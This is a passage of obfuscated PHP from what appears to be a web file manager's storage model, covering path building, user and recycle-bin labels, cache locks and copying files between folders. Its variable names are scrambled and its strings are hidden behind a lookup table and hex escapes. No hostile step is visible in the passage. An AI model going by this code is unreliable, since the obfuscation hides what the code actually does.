$ÇâÁ•Ä×[$ œ—îÅë[565]] = $–Ó°¿¶Ï[$ œ—îÅë[180]]; $ÇâÁ•Ä×[$ œ—îÅë[566]] = $–Ó°¿¶Ï[$ œ—îÅë[563]]; $ÇâÁ•Ä×[$ œ—îÅë[567]] = $–Ó°¿¶Ï[$ œ—îÅë[568]]; $ÇâÁ•Ä×[$ œ—îÅë[569]] = $ÕÀüøˆ . $–Ó°¿¶Ï[$ œ—îÅë[87]][$ œ—îÅë[181]]; } protected function _listAppendPath(&$ÉáÊñ†Ç, $‡ÊäüæÕ = false) { $íÖ—Òæ¶ =& $_SERVER[–Ú¬çÁ]; static $ô©ŒÇú˜ = array(); $é½èóÛ = array(); $§ŸÔŒ« = array(); if ($‡ÊäüæÕ) { return $ô©ŒÇú˜; } foreach ($ÉáÊñ†Ç as &$õƒ÷ß¯) { $Ïú—Àò” = $õƒ÷ß¯[$íÖ—Òæ¶[181]]; if ($õƒ÷ß¯[$íÖ—Òæ¶[462]] == $íÖ—Òæ¶[88] && $õƒ÷ß¯[$íÖ—Òæ¶[180]] != 0) { $ô©ŒÇú˜[$Ïú—Àò”] = $õƒ÷ß¯[$íÖ—Òæ¶[32]]; } if ($õƒ÷ß¯[$íÖ—Òæ¶[462]] == $íÖ—Òæ¶[88] && $õƒ÷ß¯[$íÖ—Òæ¶[180]] == 0) { $ô©ŒÇú˜[$Ïú—Àò”] = $this->_listAppendPathRoot($õƒ÷ß¯, array()); } if (isset($§ŸÔŒ«[$õƒ÷ß¯[$íÖ—Òæ¶[563]]])) { continue; } $§ŸÔŒ«[$õƒ÷ß¯[$íÖ—Òæ¶[563]]] = !0; $Åé­€ = $this->parentLevelArray($õƒ÷ß¯[$íÖ—Òæ¶[563]]); foreach ($Åé­€ as $¶†Ş®›š => $ÃŠßÃçÍ) { if (isset($ô©ŒÇú˜[$ÃŠßÃçÍ])) { continue; } if ($¶†Ş®›š == 0) { $ô©ŒÇú˜[$ÃŠßÃçÍ] = $this->_listAppendPathRoot($õƒ÷ß¯, $Åé­€); } if ($¶†Ş®›š != 0) { $é½èóÛ[] = $ÃŠßÃçÍ; } } } unset($õƒ÷ß¯); $é½èóÛ = array_unique($é½èóÛ); if (count($é½èóÛ) > 0) { $şåÀ¦İ— = array($íÖ—Òæ¶[468] => array($íÖ—Òæ¶[469], $é½èóÛ)); if (count($é½èóÛ) == 1) { $µÂ¾˜ª… = $this->sourceInfo($é½èóÛ[0]); $À©­Æû‡ = is_array($µÂ¾˜ª…) ? array($µÂ¾˜ª…) : !1; } else { $À©­Æû‡ = $this->field($íÖ—Òæ¶[570])->where($şåÀ¦İ—)->select(); } if (!$À©­Æû‡) { $À©­Æû‡ = array(); } foreach ($À©­Æû‡ as $å‘ã“æÏ) { $ô©ŒÇú˜[$å‘ã“æÏ[$íÖ—Òæ¶[181]]] = $å‘ã“æÏ[$íÖ—Òæ¶[32]]; } } $Œ‘…óôÍ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ƒïİÖ¾ = array(); foreach ($ÉáÊñ†Ç as &$õƒ÷ß¯) { $òÕÃˆ«¶ = $õƒ÷ß¯[$íÖ—Òæ¶[563]]; $ŸÕíöŠÀ = $íÖ—Òæ¶[12]; if (isset($ƒïİÖ¾[$òÕÃˆ«¶])) { $ŸÕíöŠÀ = $ƒïİÖ¾[$òÕÃˆ«¶]; } else { $Åé­€ = $this->parentLevelArray($õƒ÷ß¯[$íÖ—Òæ¶[563]]); foreach ($Åé­€ as $¶†Ş®›š => $ÃŠßÃçÍ) { if (isset($ô©ŒÇú˜[$ÃŠßÃçÍ])) { $ŸÕíöŠÀ .= $ô©ŒÇú˜[$ÃŠßÃçÍ] . $íÖ—Òæ¶[8]; } } $ƒïİÖ¾[$òÕÃˆ«¶] = $ŸÕíöŠÀ; } $ŸÕíöŠÀ .= $õƒ÷ß¯[$íÖ—Òæ¶[32]]; if ($õƒ÷ß¯[$íÖ—Òæ¶[462]] == $íÖ—Òæ¶[88]) { $ŸÕíöŠÀ .= $íÖ—Òæ¶[8]; } $õƒ÷ß¯[$íÖ—Òæ¶[561]] = str_replace($íÖ—Òæ¶[571], $íÖ—Òæ¶[8], $ŸÕíöŠÀ); if ($õƒ÷ß¯[$íÖ—Òæ¶[180]] == $íÖ—Òæ¶[222]) { $õƒ÷ß¯[$íÖ—Òæ¶[32]] = trim($ô©ŒÇú˜[$õƒ÷ß¯[$íÖ—Òæ¶[181]]], $íÖ—Òæ¶[8]); $õƒ÷ß¯[$íÖ—Òæ¶[561]] = $õƒ÷ß¯[$íÖ—Òæ¶[32]] . $íÖ—Òæ¶[8]; } if (intval($õƒ÷ß¯[$íÖ—Òæ¶[178]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($õƒ÷ß¯, $Åé­€, $Œ‘…óôÍ); } } unset($õƒ÷ß¯); return $ÉáÊñ†Ç; } private function _listAppendPathRecycle(&$áµñÏù•, $ºÀ‡¦ŒÆ, $ƒÖá®© ) { $°­âÈÌ¢ =& $_SERVER[–Ú¬çÁ]; if (!in_array($ƒÖá®© , $ºÀ‡¦ŒÆ) && $áµñÏù•[$°­âÈÌ¢[181]] != $ƒÖá®© ) { return; } $ô†¡éÂ¼ = explode($°­âÈÌ¢[8], trim($áµñÏù•[$°­âÈÌ¢[561]], $°­âÈÌ¢[8])); $Á¿Ï‰‰ò = implode($°­âÈÌ¢[8], array_slice($ô†¡éÂ¼, 2)); $áµñÏù•[$°­âÈÌ¢[561]] = $°­âÈÌ¢[8] . LNG($°­âÈÌ¢[572]) . $°­âÈÌ¢[8] . ltrim($Á¿Ï‰‰ò, $°­âÈÌ¢[8]); $áµñÏù•[$°­âÈÌ¢[563]] = $°­âÈÌ¢[573] . implode($°­âÈÌ¢[50], array_slice($ºÀ‡¦ŒÆ, 1)) . $°­âÈÌ¢[50]; if ($áµñÏù•[$°­âÈÌ¢[181]] == $ƒÖá®© ) { $áµñÏù•[$°­âÈÌ¢[563]] = $°­âÈÌ¢[573]; $áµñÏù•[$°­âÈÌ¢[180]] = $°­âÈÌ¢[222]; $áµñÏù•[$°­âÈÌ¢[32]] = LNG($°­âÈÌ¢[572]); } $áµñÏù•[$°­âÈÌ¢[574]] = $°­âÈÌ¢[575]; } protected function _listAppendPathRoot(&$ª½¥½ –, $×¦¿¸ô) { $ÔÌª‰®” =& $_SERVER[–Ú¬çÁ]; static $çÓë·äÌ = false; $ ÁÚøè = $ÔÌª‰®”[12]; if ($ª½¥½ –[$ÔÌª‰®”[178]] == self::TYPE_USER) { if ($ª½¥½ –[$ÔÌª‰®”[548]] == USER_ID) { $ ÁÚøè = LNG($ÔÌª‰®”[576]); if ($çÓë·äÌ === !1) { $Ş‚Ú²ä¨ = Model($ÔÌª‰®”[577])->getInfoFull(USER_ID); $çÓë·äÌ = _get($Ş‚Ú²ä¨, $ÔÌª‰®”[578], $ÔÌª‰®”[12]); } if ($×¦¿¸ô && $×¦¿¸ô[0] == $çÓë·äÌ || !$×¦¿¸ô && $ª½¥½ –[$ÔÌª‰®”[181]] == $çÓë·äÌ) { $ ÁÚøè = LNG($ÔÌª‰®”[579]); $ª½¥½ –[$ÔÌª‰®”[580]] = $ÔÌª‰®”[581]; } if (!$×¦¿¸ô) { $ª½¥½ –[$ÔÌª‰®”[32]] = $ ÁÚøè; } } else { $ª½¥½ –[$ÔÌª‰®”[582]] = Model($ÔÌª‰®”[556])->getInfoSimpleOuter($ª½¥½ –[$ÔÌª‰®”[548]]); $ ÁÚøè = LNG($ÔÌª‰®”[583]) . $ÔÌª‰®”[163] . $ª½¥½ –[$ÔÌª‰®”[582]][$ÔÌª‰®”[32]] . $ÔÌª‰®”[165]; } } else { if ($ª½¥½ –[$ÔÌª‰®”[178]] == self::TYPE_GROUP) { $‘¼öçÓÍ = Model($ÔÌª‰®”[564])->getInfoSimple($ª½¥½ –[$ÔÌª‰®”[548]]); $ ÁÚøè = $‘¼öçÓÍ[$ÔÌª‰®”[32]]; } else { if ($ª½¥½ –[$ÔÌª‰®”[178]] == self::TYPE_SYSTEM) { $ ÁÚøè = $ÔÌª‰®”[584]; } } } $ ÁÚøè = $ ÁÚøè ? $ÔÌª‰®”[8] . $ ÁÚøè . $ÔÌª‰®”[8] : $ÔÌª‰®”[8]; return $ ÁÚøè; } protected function _listAppendUser(&$ƒ£—½˜Ù) { $Ä‚˜›Á– =& $_SERVER[–Ú¬çÁ]; $³»‚¾¿ = array_to_keyvalue($ƒ£—½˜Ù, $Ä‚˜›Á–[12], $Ä‚˜›Á–[504]); $‹†¢ëò° = array_to_keyvalue($ƒ£—½˜Ù, $Ä‚˜›Á–[12], $Ä‚˜›Á–[506]); $Š·ş = array_merge($³»‚¾¿, $‹†¢ëò°); $ªıìúÂ = Model($Ä‚˜›Á–[577])->userListInfo($Š·ş); foreach ($ƒ£—½˜Ù as &$œµù­š) { $øû›«Õ¡ = $œµù­š[$Ä‚˜›Á–[504]]; $œµù­š[$Ä‚˜›Á–[504]] = $ªıìúÂ[$øû›«Õ¡] ? $ªıìúÂ[$øû›«Õ¡] : !1; $øû›«Õ¡ = $œµù­š[$Ä‚˜›Á–[506]]; $œµù­š[$Ä‚˜›Á–[506]] = $ªıìúÂ[$øû›«Õ¡] ? $ªıìúÂ[$øû›«Õ¡] : !1; if (isset($œµù­š[$Ä‚˜›Á–[516]]) && $œµù­š[$Ä‚˜›Á–[516]][$Ä‚˜›Á–[585]]) { $§ŠğæÓ¼ = $GLOBALS[$Ä‚˜›Á–[6]][$Ä‚˜›Á–[89]][$Ä‚˜›Á–[586]]; if ($œµù­š[$Ä‚˜›Á–[516]][$Ä‚˜›Á–[587]] <= time() - $§ŠğæÓ¼) { $this->metaSet($œµù­š[$Ä‚˜›Á–[181]], $Ä‚˜›Á–[585], null); $this->metaSet($œµù­š[$Ä‚˜›Á–[181]], $Ä‚˜›Á–[587], null); unset($œµù­š[$Ä‚˜›Á–[516]][$Ä‚˜›Á–[585]]); continue; } $Éœù¹Æš = $œµù­š[$Ä‚˜›Á–[516]][$Ä‚˜›Á–[585]]; $œµù­š[$Ä‚˜›Á–[516]][$Ä‚˜›Á–[588]] = Model($Ä‚˜›Á–[577])->getInfoSimpleOuter($Éœù¹Æš); } } unset($œµù­š); } public function parentLevelArray($…¯Í¥´) { $½Á­®§º =& $_SERVER[–Ú¬çÁ]; $…¯Í¥´ = explode($½Á­®§º[50], trim($…¯Í¥´, $½Á­®§º[50])); return array_remove_value($…¯Í¥´, $½Á­®§º[222]); } public function listAll($€­©ªŞ) { $àŠœóğ =& $_SERVER[–Ú¬çÁ]; $ Õ«æ€é = $this->sourceInfo($€­©ªŞ); $–Š–û—¿ = array($àŠœóğ[589] => array($àŠœóğ[590], $ Õ«æ€é[$àŠœóğ[563]] . $€­©ªŞ . $àŠœóğ[591]), $àŠœóğ[592] => 0); $§›½Õå¥ = $àŠœóğ[593]; $· ˆÀğ¿ = "\x4c\105\106\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\151\157\x5f\146\151\x6c\x65\40\x66\x69\x6c\x65\x20\x6f\x6e\40\x73\157\x75\162\143\x65\56\146\x69\154\145\x49\x44\x20\x3d\40\x66\151\154\x65\x2e\146\x69\154\x65\111\x44"; $Û…ªéòÛ = $this->alias($àŠœóğ[496])->field($§›½Õå¥)->where($–Š–û—¿)->join($· ˆÀğ¿)->select(); $this->_listAppendAuth($Û…ªéòÛ); $this->_listAppendUser($Û…ªéòÛ); $this->_listAppendPath($Û…ªéòÛ); $Û…ªéòÛ = array_to_keyvalue($Û…ªéòÛ, $àŠœóğ[181]); $·²™ûì¸ = "\57{$ Õ«æ€é[$àŠœóğ[32]]}\x2f"; $·²™ûì¸ = $·²™ûì¸ == $àŠœóğ[571] ? $àŠœóğ[8] : $·²™ûì¸; $ôÒà‡ªÀ = array(); foreach ($Û…ªéòÛ as $Ÿğ“œ¯ù => $å°ö“ë¼) { $¡ş˜€ç = $this->parentLevelArray($å°ö“ë¼[$àŠœóğ[563]]); array_shift($¡ş˜€ç); $„ĞÎ£ã˜ = $·²™ûì¸; for ($–ˆƒ“Ì = 0; $–ˆƒ“Ì < count($¡ş˜€ç); $–ˆƒ“Ì++) { $„ĞÎ£ã˜ .= $Û…ªéòÛ[$¡ş˜€ç[$–ˆƒ“Ì]][$àŠœóğ[32]] . $àŠœóğ[8]; } $„ĞÎ£ã˜ .= $å°ö“ë¼[$àŠœóğ[32]]; if ($å°ö“ë¼[$àŠœóğ[462]]) { $„ĞÎ£ã˜ .= $àŠœóğ[8]; } $¬¸î›ñõ = array($àŠœóğ[472] => str_replace($àŠœóğ[571], $àŠœóğ[8], str_replace($àŠœóğ[571], $àŠœóğ[8], str_replace($àŠœóğ[571], $àŠœóğ[8], $„ĞÎ£ã˜))), $àŠœóğ[594] => intval($å°ö“ë¼[$àŠœóğ[462]]), $àŠœóğ[595] => intval($å°ö“ë¼[$àŠœóğ[76]]), $àŠœóğ[85] => intval($å°ö“ë¼[$àŠœóğ[85]]), $àŠœóğ[87] => $this->pathInfoFilter($å°ö“ë¼)); if (!$¬¸î›ñõ[$àŠœóğ[462]]) { $¬¸î›ñõ[$àŠœóğ[518]] = $å°ö“ë¼[$àŠœóğ[518]]; } $ôÒà‡ªÀ[] = $¬¸î›ñõ; } $ôÒà‡ªÀ = array_sort_by($ôÒà‡ªÀ, $àŠœóğ[84]); return $ôÒà‡ªÀ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($öâ—ÉšÍ) { $æ•ƒÏØ© =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($æ•ƒÏØ©[596], $öâ—ÉšÍ); $¡¯áõùÆ = 1; $this->_lockEvent($öâ—ÉšÍ, array($æ•ƒÏØ©[597], $æ•ƒÏØ©[598]), $¡¯áõùÆ); $this->_lockParent($öâ—ÉšÍ, array($æ•ƒÏØ©[598]), $¡¯áõùÆ); $this->_lockEvent($öâ—ÉšÍ, array($æ•ƒÏØ©[599], $æ•ƒÏØ©[600]), $¡¯áõùÆ); $this->_lockCheckEnd($æ•ƒÏØ©[596], $öâ—ÉšÍ); } public function lockCopyEnd($êŠ«Ï€å) { $²Ù—Á£¦ =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $Ì—ê¾ìÅ = 0; $this->_lockEvent($êŠ«Ï€å, array($²Ù—Á£¦[597], $²Ù—Á£¦[598]), $Ì—ê¾ìÅ); $this->_lockParent($êŠ«Ï€å, array($²Ù—Á£¦[598]), $Ì—ê¾ìÅ); $this->_lockEvent($êŠ«Ï€å, array($²Ù—Á£¦[599], $²Ù—Á£¦[600]), $Ì—ê¾ìÅ); } public function lockWriteStart($–Ÿ¹ÉœÅ, $¨àÖ©ÑÁ = '') { $¡ÛİùÈğ =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡ÛİùÈğ[597], $–Ÿ¹ÉœÅ); $à¼»»õÇ = 1; $this->_lockKey($¡ÛİùÈğ[601] . $–Ÿ¹ÉœÅ . $¡ÛİùÈğ[10] . $¨àÖ©ÑÁ, $à¼»»õÇ); $this->_lockEvent($–Ÿ¹ÉœÅ, array($¡ÛİùÈğ[596], $¡ÛİùÈğ[598]), $à¼»»õÇ); $this->_lockParent($–Ÿ¹ÉœÅ, array($¡ÛİùÈğ[596], $¡ÛİùÈğ[598]), $à¼»»õÇ); $this->_lockCheckEnd($¡ÛİùÈğ[597], $–Ÿ¹ÉœÅ); } public function lockWriteEnd($¢›íÎà», $Ó¯‹¯•¤ = '') { $Æ–ã¨©Ì =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $ø…èÀ…™ = 0; $this->_lockKey($Æ–ã¨©Ì[601] . $¢›íÎà» . $Æ–ã¨©Ì[10] . $Ó¯‹¯•¤, $ø…èÀ…™); $this->_lockEvent($¢›íÎà», array($Æ–ã¨©Ì[596], $Æ–ã¨©Ì[598]), $ø…èÀ…™); $this->_lockParent($¢›íÎà», array($Æ–ã¨©Ì[596], $Æ–ã¨©Ì[598]), $ø…èÀ…™); } public function lockMoveStart($§š•Åå²) { $ÁºŒ‹«ì =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÁºŒ‹«ì[598], $§š•Åå²); $£¥´Ûµ÷ = 1; $this->_lockKey($ÁºŒ‹«ì[602] . $§š•Åå², $£¥´Ûµ÷); $this->_lockEvent($§š•Åå², array($ÁºŒ‹«ì[596], $ÁºŒ‹«ì[597]), $£¥´Ûµ÷); $this->_lockParent($§š•Åå², array($ÁºŒ‹«ì[596], $ÁºŒ‹«ì[598]), $£¥´Ûµ÷); $this->_lockEvent($§š•Åå², array($ÁºŒ‹«ì[603], $ÁºŒ‹«ì[599], $ÁºŒ‹«ì[600]), $£¥´Ûµ÷); $this->_lockCheckEnd($ÁºŒ‹«ì[598], $§š•Åå²); } public function lockMoveEnd($±ù™ü¦Å) { $ñ©˜ó®î =& $_SERVER[–Ú¬çÁ]; if (!$this->allowLock()) { return; } $úßÉ±„ = 0; $this->_lockKey($ñ©˜ó®î[602] . $±ù™ü¦Å, $úßÉ±„); $this->_lockEvent($±ù™ü¦Å, array($ñ©˜ó®î[596], $ñ©˜ó®î[597]), $úßÉ±„); $this->_lockParent($±ù™ü¦Å, array($ñ©˜ó®î[596], $ñ©˜ó®î[598]), $úßÉ±„); $this->_lockEvent($±ù™ü¦Å, array($ñ©˜ó®î[603], $ñ©˜ó®î[599], $ñ©˜ó®î[600]), $úßÉ±„); } private function _lockCheck($ù°ñôş , $æş¹Ûš) { $ñÅ™õİ¾ =& $_SERVER[–Ú¬çÁ]; $·ëœ‹¤· = $this->sourceInfo($æş¹Ûš); $øÍŒ½üÂ = $ù°ñôş  . $ñÅ™õİ¾[10] . $æş¹Ûš; $this->_lockTimeStart[$øÍŒ½üÂ] = timeFloat(); if (!is_array($·ëœ‹¤·)) { return; } $»‡˜ş¬ = LNG($ñÅ™õİ¾[604]); CacheLock::setErrorMsg($ñÅ™õİ¾[163] . htmlspecialchars($·ëœ‹¤·[$ñÅ™õİ¾[32]]) . $ñÅ™õİ¾[165] . $»‡˜ş¬); $this->_lockKey($øÍŒ½üÂ, 1); $this->_lockKey($øÍŒ½üÂ, 0); $¥ùõÆ‹Æ = array_reverse($this->parentLevelArray($·ëœ‹¤·[$ñÅ™õİ¾[563]])); foreach ($¥ùõÆ‹Æ as $€˜ÂĞÂ) { $øÍŒ½üÂ = $ù°ñôş  . $ñÅ™õİ¾[605] . $€˜ÂĞÂ; if (CacheLock::lockGet($ñÅ™õİ¾[606] . $øÍŒ½üÂ)) { $·ëœ‹¤· = $this->sourceInfo($€˜ÂĞÂ); CacheLock::setErrorMsg($ñÅ™õİ¾[163] . htmlspecialchars($·ëœ‹¤·[$ñÅ™õİ¾[32]]) . $ñÅ™õİ¾[165] . $»‡˜ş¬); $this->_lockKey($øÍŒ½üÂ, 1); $this->_lockKey($øÍŒ½üÂ, 0); } } } private function _lockCheckEnd($ç»òá’Ô, $äÉ‰•Î“) { $»ÓÍêÍİ =& $_SERVER[–Ú¬çÁ]; $îºøäè = $ç»òá’Ô . $»ÓÍêÍİ[10] . $äÉ‰•Î“; CacheLock::setErrorMsg($»ÓÍêÍİ[431]); if (!isset($this->_lockTimeStart[$îºøäè])) { return; } $º¾üóŸì = timeFloat() - $this->_lockTimeStart[$îºøäè]; unset($this->_lockTimeStart[$îºøäè]); if ($º¾üóŸì > 0.5) { unset(self::$cacheSourceInfo[$»ÓÍêÍİ[510] . $äÉ‰•Î“]); } $ò€¡ÌƒÔ = $this->sourceInfo($äÉ‰•Î“); if (!$ò€¡ÌƒÔ) { show_json(LNG($»ÓÍêÍİ[105]), !1); } } private function _lockParent($ôğŠ³¬Ô, $»ğ¤ø¨­, $ï¹õ÷¦§) { if (!$this->autoLockSet) { return; } $Ó¼„ø = $this->sourceInfo($ôğŠ³¬Ô); if (!is_array($Ó¼„ø)) { return; } $™“ß•¾Ñ = array_reverse($this->parentLevelArray($Ó¼„ø[$_SERVER[–Ú¬çÁ][563]])); foreach ($™“ß•¾Ñ as $¸¶‡ÌÇ) { $this->_lockEvent($¸¶‡ÌÇ, $»ğ¤ø¨­, $ï¹õ÷¦§); } } private function _lockEvent($ò”ú±òş, $ÊÜĞò¸Ù, $ˆÚÇØ®µ) { $ÓÆñöæ› =& $_SERVER[–Ú¬çÁ]; if (!$this->autoLockSet) { return; } foreach ($ÊÜĞò¸Ù as $î¸‘òÚÆ) { $¯¯ıÁßà = $î¸‘òÚÆ . $ÓÆñöæ›[10] . $ò”ú±òş; if ($ˆÚÇØ®µ && CacheLock::lockGet($ÓÆñöæ›[606] . $¯¯ıÁßà)) { continue; } $this->_lockKey($¯¯ıÁßà, $ˆÚÇØ®µ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($È…ŠıùÀ, $«Õ¼™×Ş = 1) { $ñÛèÚñ = $_SERVER[–Ú¬çÁ][606] . md5($È…ŠıùÀ); if ($«Õ¼™×Ş) { if (isset(self::$_lockItemArr[$ñÛèÚñ])) { return; } self::$_lockItemArr[$ñÛèÚñ] = 1; CacheLock::lock($ñÛèÚñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ñÛèÚñ])) { return; } unset(self::$_lockItemArr[$ñÛèÚñ]); CacheLock::unlock($ñÛèÚñ); } } public function isParentOf($Ù¦ì†¹, $Ş·äè®˜) { $©±§·ÓÚ =& $_SERVER[–Ú¬çÁ]; $©ë¹šò = $this->sourceInfo($Ù¦ì†¹); $·Ö®«éÙ = $this->sourceInfo($Ş·äè®˜); $÷Ø´ç£² = $©ë¹šò[$©±§·ÓÚ[563]] . $©ë¹šò[$©±§·ÓÚ[181]] . $©±§·ÓÚ[50]; $ìÍ³ó‹‘ = $·Ö®«éÙ[$©±§·ÓÚ[563]] . $·Ö®«éÙ[$©±§·ÓÚ[181]] . $©±§·ÓÚ[50]; $œÔ­ßË = strpos($ìÍ³ó‹‘, $÷Ø´ç£²) === 0; return $œÔ­ßË; } private $targetIsDelete = 0; public function copy($ÏÀç“Â¡, $¼Ù¥ö¶õ, $ó¹ ÉÄ = REPEAT_REPLACE, $¬³™÷¦­ = '') { $Œ¼å‚ÙÙ =& $_SERVER[–Ú¬çÁ]; $ş‹ö«ÔÀ = $this->sourceInfo($ÏÀç“Â¡); $Ù®‡Í¿ = $this->sourceInfo($¼Ù¥ö¶õ); if (!$ş‹ö«ÔÀ || !$Ù®‡Í¿ || $Ù®‡Í¿[$Œ¼å‚ÙÙ[462]] != $Œ¼å‚ÙÙ[88]) { return !1; } if ($this->isParentOf($ÏÀç“Â¡, $¼Ù¥ö¶õ)) { return !1; } $ÅØ³¾Å• = $¬³™÷¦­ ? $¬³™÷¦­ : $ş‹ö«ÔÀ[$Œ¼å‚ÙÙ[32]]; $this->lockCopyStart($ÏÀç“Â¡); $this->lockWriteStart($¼Ù¥ö¶õ, $ÅØ³¾Å•); $ìı’õ¶… = array($Œ¼å‚ÙÙ[607] => array(), $Œ¼å‚ÙÙ[608] => array(), $Œ¼å‚ÙÙ[609] => array()); $this->targetIsDelete = intval($ş‹ö«ÔÀ[$Œ¼å‚ÙÙ[482]]); $€™åç°ô = $this->fileNameExistAuto($¼Ù¥ö¶õ, $ş‹ö«ÔÀ); $ŒùÙ‹Ùö = $this->_copy($ÏÀç“Â¡, $¼Ù¥ö¶õ, $ó¹ ÉÄ, $ìı’õ¶…, !0, $¬³™÷¦­); $this->_childrenListClear(); $this->lockCopyEnd($ÏÀç“Â¡); $this->lockWriteEnd($¼Ù¥ö¶õ, $ÅØ³¾Å•); if ($ş‹ö«ÔÀ[$Œ¼å‚ÙÙ[462]] == $Œ¼å‚ÙÙ[88] && $€™åç°ô == $ŒùÙ‹Ùö) { $this->folderSizeResetChildren($€™åç°ô); } Model($Œ¼å‚ÙÙ[610])->addAll($ìı’õ¶…[$Œ¼å‚ÙÙ[608]], array(), !0); if ($€™åç°ô != $ŒùÙ‹Ùö || $ş‹ö«ÔÀ[$Œ¼å‚ÙÙ[462]] == $Œ¼å‚ÙÙ[88]) { Model($Œ¼å‚ÙÙ[611])->eventCopy($ŒùÙ‹Ùö); } $this->saveAll($ìı’õ¶…[$Œ¼å‚ÙÙ[609]]); Model($Œ¼å‚ÙÙ[224])->linkAdd($ìı’õ¶…[$Œ¼å‚ÙÙ[607]]); $this->folderSizeReset($¼Ù¥ö¶õ); $this->updateModifyTime($¼Ù¥ö¶õ); return $ŒùÙ‹Ùö; } private function _copy($ğ¢Ôëàæ, $ã˜ŠÒ©, $×‡ÁçÀ, &$¾«÷òË§, $íÉæ²àÅ, $Úƒ¨¹ç— = '') { $†·Áæ÷ =& $_SERVER[–Ú¬çÁ]; $ÇÓ§´»¡ = $this->sourceInfoCache($ğ¢Ôëàæ); $ïôõö¸í = $ÇÓ§´»¡[$†·Áæ÷[462]] == $†·Áæ÷[88]; $ØÊ´¼å˜ = $Úƒ¨¹ç— ? $Úƒ¨¹ç— : $ÇÓ§´»¡[$†·Áæ÷[32]]; $±‘Úáç­ = $this->fileNameExistAuto($ã˜ŠÒ©, $ÇÓ§´»¡); if ($íÉæ²àÅ) { $this->_childrenAllMake($ğ¢Ôëàæ); if ($ïôõö¸í && $±‘Úáç­) { $this->_childrenAllMake($±‘Úáç­); } } if (!$±‘Úáç­) { return $this->_copyCreate($ğ¢Ôëàæ, $ã˜ŠÒ©, $ØÊ´¼å˜, $¾«÷òË§); } $ĞôŠê¸ = $±‘Úáç­; if ($ïôõö¸í) { if ($×‡ÁçÀ == REPEAT_RENAME_FOLDER) { $ØÊ´¼å˜ = $this->fileNameAutoCache($ã˜ŠÒ©, $ØÊ´¼å˜, $×‡ÁçÀ, $ïôõö¸í); $ĞôŠê¸ = $this->_copyCreate($ğ¢Ôëàæ, $ã˜ŠÒ©, $ØÊ´¼å˜, $¾«÷òË§); } else { $ø¶™é– = $this->_childrenList($ğ¢Ôëàæ); foreach ($ø¶™é– as $÷ËäÁ¯) { $this->_copy($÷ËäÁ¯[$†·Áæ÷[181]], $±‘Úáç­, $×‡ÁçÀ, $¾«÷òË§, !1); } } } else { if ($×‡ÁçÀ == REPEAT_RENAME || $×‡ÁçÀ == REPEAT_RENAME_FOLDER) { $ØÊ´¼å˜ = $this->fileNameAutoCache($ã˜ŠÒ©, $ØÊ´¼å˜, $×‡ÁçÀ, $ïôõö¸í); $ĞôŠê¸ = $this->_copyCreate($ğ¢Ôëàæ, $ã˜ŠÒ©, $ØÊ´¼å˜, $¾«÷òË§); } else { if ($×‡ÁçÀ == REPEAT_REPLACE) { $»´õæ†Ú = $this->sourceInfoCache($±‘Úáç­); $Åªßü°Ë = $this->fileHistory($»´õæ†Ú, $ÇÓ§´»¡[$†·Áæ÷[518]], $ÇÓ§´»¡[$†·Áæ÷[76]]); if ($Åªßü°Ë) { $¾«÷òË§[$†·Áæ÷[607]][] = $ÇÓ§´»¡[$†·Áæ÷[518]]; } } else { if ($×‡ÁçÀ == REPEAT_SKIP) { } } } Hook::trigger($†·Áæ÷[612], array($†·Áæ÷[613], $ÇÓ§´»¡, 0)); } return $ĞôŠê¸; } private function _copyCreate($À¹Ä‚À, $­¾ã÷ùÉ, $Ï§ËÜÅâ, &$àµùøãƒ) { $£ä¤€¯ =& $_SERVER[–Ú¬çÁ]; $é¸»èØ¼ = $this->sourceInfoCache($À¹Ä‚À); $š…ß½øæ = $this->sourceInfoCache($­¾ã÷ùÉ); $‚¤Ñ€ñª = $this->_makeItemData($é¸»èØ¼, $š…ß½øæ, $Ï§ËÜÅâ); Hook::trigger($£ä¤€¯[614], $‚¤Ñ€ñª); Hook::trigger($£ä¤€¯[615], array($£ä¤€¯[616], $‚¤Ñ€ñª, 0)); $Ôß•ğğ¹ = $this->add($‚¤Ñ€ñª); $‹Íºİ«½ = array($£ä¤€¯[181] => $Ôß•ğğ¹, $£ä¤€¯[32] => $Ï§ËÜÅâ); $this->_copyApplyMeta($‹Íºİ«½, $àµùøãƒ); if ($é¸»èØ¼[$£ä¤€¯[462]] != $£ä¤€¯[88]) { $àµùøãƒ[$£ä¤€¯[607]][] = $é¸»èØ¼[$£ä¤€¯[518]]; return $Ôß•ğğ¹; } $ä¥Ş¦ô = array(); $êƒçÄ = array(); $this->_childrenListAll($À¹Ä‚À, $ä¥Ş¦ô); $¡¨üîÒí = count($ä¥Ş¦ô); if ($¡¨üîÒí == 0) { return $Ôß•ğğ¹; } $ƒ¿–äñä = $this->sourceInfo($Ôß•ğğ¹); foreach ($ä¥Ş¦ô as $óöë÷µÃ) { $¾ù¿À±÷ = $this->_makeItemData($óöë÷µÃ, $ƒ¿–äñä, $óöë÷µÃ[$£ä¤€¯[32]]); $¾ù¿À±÷[$£ä¤€¯[563]] = $óöë÷µÃ[$£ä¤€¯[563]]; $êƒçÄ[] = $¾ù¿À±÷; } $this->chunkEventSet($£ä¤€¯[617], array($£ä¤€¯[618], $‚¤Ñ€ñª, $¡¨üîÒí)); $this->addAll($êƒçÄ, array(), !1); $Û©îÛÎ­ = $this->where(array($£ä¤€¯[180] => $Ôß•ğğ¹))->select(); $ÓãÙğšé = $this->_childrenMakeRelation($ä¥Ş¦ô, $Û©îÛÎ­); $ÓãÙğšé[$À¹Ä‚À] = $Ôß•ğğ¹; $”°¾ö· = array(); $ŸêÚÆ–ò = array(); foreach ($Û©îÛÎ­ as $óöë÷µÃ) { $Ç˜ğ—‡² = $óöë÷µÃ[$£ä¤€¯[181]]; $İ‘Áûä = 